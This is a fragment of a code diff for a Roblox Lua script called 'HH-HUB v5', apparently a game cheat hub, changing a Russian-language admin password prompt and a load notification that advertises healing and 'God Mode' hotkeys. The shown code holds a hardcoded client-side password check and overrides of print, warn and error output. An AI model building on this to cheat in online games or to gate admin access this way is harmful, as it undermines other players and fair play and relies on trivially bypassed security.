             box.Font = Enum.Font.Gotham
             box.Parent = passFrame
             
-            local bCorner = Instance.new("UICorner")
-            bCorner.CornerRadius = UDim.new(0, 8)
-            bCorner.Parent = box
-            
             local submit = Instance.new("TextButton")
             submit.Size = UDim2.new(0.5, 0, 0, 35)
             submit.Position = UDim2.new(0.25, 0, 0.7, 0)
-            submit.BackgroundColor3 = Color3.fromRGB(140, 80, 255)
-            submit.Text = "ВОЙТИ"
+            submit.BackgroundColor3 = Color3.fromRGB(100, 50, 255)
+            submit.Text = "Войти"
             submit.TextColor3 = Color3.fromRGB(255, 255, 255)
             submit.TextScaled = true
             submit.Font = Enum.Font.GothamBold
             submit.Parent = passFrame
             
-            local sCorner = Instance.new("UICorner")
-            sCorner.CornerRadius = UDim.new(0, 8)
-            sCorner.Parent = submit
-            
             submit.MouseButton1Click:Connect(function()
                 if box.Text == ADMIN_PASSWORD then
                     isAdmin = true
-                    LP:SetAttribute(ADMIN_FLAG, "1")
                     passGui:Destroy()
                     createAdminPanel()
                     fetchUsers()
                 else
                     box.Text = ""
-                    box.PlaceholderText = "Неверный пароль!"
-                end
-            end)
-            
-            box.FocusLost:Connect(function(enter)
-                if enter and box.Text ~= "" then
-                    if box.Text == ADMIN_PASSWORD then
-                        isAdmin = true
-                        LP:SetAttribute(ADMIN_FLAG, "1")
-                        passGui:Destroy()
-                        createAdminPanel()
-                        fetchUsers()
-                    else
-                        box.Text = ""
-                        box.PlaceholderText = "Неверный пароль!"
-                    end
+                    box.PlaceholderText = "Неверно!"
                 end
             end)
         else
@@ -2324,16 +1970,15 @@ UIS.InputBegan:Connect(function(input, gp)
 end)
 
 -- ==============================================
--- ЗАВЕРШЕНИЕ
+-- ЗАПУСК
 -- ==============================================
 task.wait(1)
 SG:SetCore("SendNotification", {
     Title = "⚡ HH-HUB v5",
-    Text = "Загружено! END - админ-панель",
-    Duration = 3
+    Text = "Загружено! INS - лечение, DEL - God Mode",
+    Duration = 4
 })
 
--- Восстанавливаем вывод
 print = oldPrint
 warn = oldWarn
 error = oldError
